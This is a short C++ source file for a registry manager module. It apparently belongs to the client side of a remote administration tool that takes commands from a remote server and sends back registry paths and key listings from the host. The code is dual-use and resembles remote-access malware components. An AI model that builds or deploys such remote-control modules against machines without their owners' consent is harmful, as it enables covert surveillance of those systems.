#include "stdafx.h"
#include "RegisterManager.h"
#include"Common.h"

CRegisterManager::CRegisterManager(IOCPClient* ClientObject)
	:CManager(ClientObject)
{
	BYTE bToken = TOKEN_REGEDIT;
	m_ClientObject->OnServerSending((char*)&bToken, 1);

}


CRegisterManager::~CRegisterManager()
{
}

VOID CRegisterManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
{
	switch (szBuffer[0])
	{
		case COMMAND_REG_FIND:
		{
			if (ulLength > 3)
			{
				Find(szBuffer[1], (char*)(szBuffer + 2));
			}
			else
			{
				Find(szBuffer[1], NULL);
			}
			break;
		}

		default:
			break;
	}
}

VOID CRegisterManager::Find(char bToken, char * szPath)
{
	RegisterOperation Opteration(bToken);

	if (szPath != NULL)
	{
		Opteration.SetPath(szPath);
	}
	char* szBuffer = Opteration.FindPath();
	if (szBuffer != NULL)
	{
		m_ClientObject->OnServerSending((char*)szBuffer, LocalSize(szBuffer));
		LocalFree(szBuffer);
	}
	szBuffer = Opteration.FindKey();
	if (szBuffer != NULL)
	{
		m_ClientObject->OnServerSending((char*)szBuffer, LocalSize(szBuffer));
		LocalFree(szBuffer);
	}
};

